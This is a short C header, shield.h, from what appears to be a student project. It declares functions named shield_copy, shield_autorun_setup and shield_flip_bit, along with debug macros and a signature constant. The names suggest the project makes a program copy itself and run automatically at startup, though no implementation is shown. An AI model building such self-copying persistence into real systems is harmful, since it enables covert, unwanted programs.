/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   shield.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 02:45:19 by kiroussa          #+#    #+#             */
/*   Updated: 2025/08/24 19:59:45 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef SHIELD_H
# define SHIELD_H

# define unused __attribute__((unused))

# ifndef SHIELD_DEBUG
#  define SHIELD_DEBUG 0
#  define DEBUG(fmt, ...)
# elif SHIELD_DEBUG == 1
#  include <stdio.h>
#  define DEBUG(fmt, ...) printf("[DEBUG] %s: " fmt, __func__ __VA_OPT__(,) __VA_ARGS__)
# endif // !SHIELD_DEBUG

# define FT_SHIELD_SIGNATURE 0x2B00B135

# ifdef __cplusplus
extern "C" {
# endif

int		shield_copy(void);
int		shield_autorun_setup(void);
int		shield_is_flipped();
int		shield_flip_bit(int fd);

# ifdef __cplusplus
}
# endif

#endif // SHIELD_H
